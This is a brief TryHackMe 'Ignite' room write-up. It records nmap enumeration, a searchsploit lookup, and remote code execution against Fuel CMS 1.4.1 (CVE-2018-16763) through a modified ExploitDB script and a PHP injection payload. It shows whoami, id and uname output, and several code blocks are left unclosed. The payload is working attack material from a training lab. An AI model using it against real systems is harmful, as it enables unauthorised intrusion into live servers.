# TryHackMe Room: Ignite

- [Room Link](https://tryhackme.com/room/ignite)
- Difficulty: Easy
- Status: ✅ Completed

---

## 🧠 Room Overview

This is a beginner-level box that showcases:
- Enumeration
- Exploiting a vulnerable **Fuel CMS**
- Uploading a reverse shell
- Gaining root access via `sudo`

---

## 🌐 Target Info

- IP: `10.10.XXX.XXX`  ← replace with real IP

---

## 🔍 Enumeration

```bash
nmap -sC -sV -oN nmap.txt 10.10.XXX.XXX

## 🔥 Vulnerability Identified

Used `searchsploit` to identify known vulnerabilities in Fuel CMS:

```bash
searchsploit fuel cms
## ⚙️ Manual Exploit Setup

Copied official RCE exploit from ExploitDB:

```bash
cp /usr/share/exploitdb/exploits/linux/webapps/47138.py ./fuel_rce.py
## 💥 Exploitation: Remote Code Execution via CVE-2018-16763

Used a Python 3–compatible version of the public Fuel CMS 1.4.1 exploit (ExploitDB 47138). Modified it to:

- Remove Burp proxy
- Use `input()` for Python 3
- Target: `http://ignite.thm`
- Payload: PHP injection using `pi(print($a='system'))+$a('cmd')`

Confirmed successful RCE:
```bash
cmd: whoami
→ www-data

cmd: id
→ uid=33(www-data) gid=33(www-data)

cmd: uname -a
→ Linux ubuntu 4.15.0-45-generic ...

